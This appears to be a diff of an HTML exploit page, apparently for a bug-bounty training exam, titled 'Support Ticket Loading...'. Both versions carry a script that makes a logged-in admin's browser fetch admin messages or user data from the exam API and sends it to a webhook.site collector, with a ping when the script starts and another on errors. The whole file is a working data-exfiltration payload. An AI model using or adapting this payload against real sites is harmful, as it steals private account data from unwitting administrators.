@@ -1,25 +1,32 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Support Ticket Loading...</title>
+</head>
 <body>
-    <h1>Processing...</h1>
     <script>
-        async function leakFlag() {
+        // Signal to your webhook that the script started
+        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/SCRIPT_STARTED');
+
+        async function getTheFlag() {
             try {
-                // 1. Fetch the admin dashboard or the specific message page
-                const response = await fetch('https://api-bugbounty-exam.hashacademy.co/admin/messages/69e37a92bee6d6b7c662cd62');
-                const html = await response.text();
+                // 1. Try to fetch the admin's own data 
+                // Using the Admin ID you found earlier
+                const response = await fetch('https://api-bugbounty-exam.hashacademy.co/api/users/69d28e841cda77b519a9550e');
+                const data = await response.json();
                 
-                // 2. Send the HTML content to your webhook (Base64 encoded to avoid breakage)
+                // 2. Send the result to your webhook
                 fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4', {
                     method: 'POST',
-                    body: btoa(html) 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
                 });
-            } catch (e) {
-                // If fetch fails, send the error to see why (likely CORS)
-                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/?error=' + btoa(e.message));
+            } catch (err) {
+                // If it fails, send the error message
+                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/ERROR?msg=' + btoa(err.message));
             }
         }
-        leakFlag();
+        getTheFlag();
     </script>
 </body>
 </html>
